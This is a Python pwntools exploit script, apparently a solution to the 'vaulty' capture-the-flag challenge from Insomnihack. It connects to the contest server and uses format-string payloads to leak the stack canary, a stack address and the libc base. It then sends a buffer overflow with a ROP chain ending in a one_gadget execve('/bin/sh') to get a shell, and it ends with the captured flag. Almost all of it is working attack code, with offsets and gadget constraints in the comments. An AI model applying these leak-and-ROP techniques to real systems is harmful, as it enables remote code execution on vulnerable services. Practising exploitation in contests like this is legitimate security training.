#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h']
exe = './vaulty_patched'
libc = ELF('./libc.so.6')

host = args.HOST or 'vaulty.insomnihack.ch'
port = int(args.PORT or 4556)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
breakrva 0x1382
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def create(username: bytes, password: bytes, url: bytes):
    io.sendlineafter(b'(1-5):\n', b'1')
    io.sendlineafter(b'name: \n', username)
    io.sendlineafter(b'word: \n', password)
    io.sendlineafter(b'URL: \n', url)

def show(index: int):
    io.sendlineafter(b'(1-5):\n', b'4')
    io.sendlineafter(b'):\n', str(index).encode())
    io.recvuntil(b'Username: ')
    username = io.recvline()
    io.recvuntil(b'Password: ')
    password = io.recvline()
    io.recvuntil(b'Url: ')
    url = io.recvline()
    return (username, password, url)


io = start()

# leak stack cookie + libc
"""
cookie is at 
│99:04c8│     0x7ffda24f18d8 ◂— 0x260b7947609d4f00  
in show function

stack leak = 0x7ffd402b6be0
base       = 0x7ffd4029b000
offset     = 0x1bbe0

libc leak = 0x7f688b714697
base      = 0x7f688b600000
offset    = 0x114697
"""
url = b'%159$llx'
create(b'%p'*10, b'A', url)
(leak, _, canary) = show(0)

stack_leak = int(leak[:14], 16)

libc.address = int(leak[19:19+14], 16) - 0x114697
info(f'libc :{hex(libc.address)}')

canary = int(canary, 16)
info(f'canary: {hex(canary)}')

# ROP to one gadget with proper conditions
"""
0x00000000000796a2 : pop rdx ; ret
0x000000000002be51 : pop rsi ; ret

one_gadget:
0xebc88 execve("/bin/sh", rsi, rdx)                                                                                                                                                                                                          
constraints:                                                                                                                                                                                                                                 
  address rbp-0x78 is writable                                                                                                                                                                                                               
  [rsi] == NULL || rsi == NULL                                                                                                                                                                                                               
  [rdx] == NULL || rdx == NULL 

"""

p = fit({
    0x28: p64(canary),
    0x40: p64(stack_leak), # rbp writable
    0x48: p64(libc.address + 0x796a2) + p64(0) + p64(libc.address + 0x2be51) + p64(0) + p64(libc.address + 0xebc88) 
})

create(b'A', b'A', p)
io.interactive()

# INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}
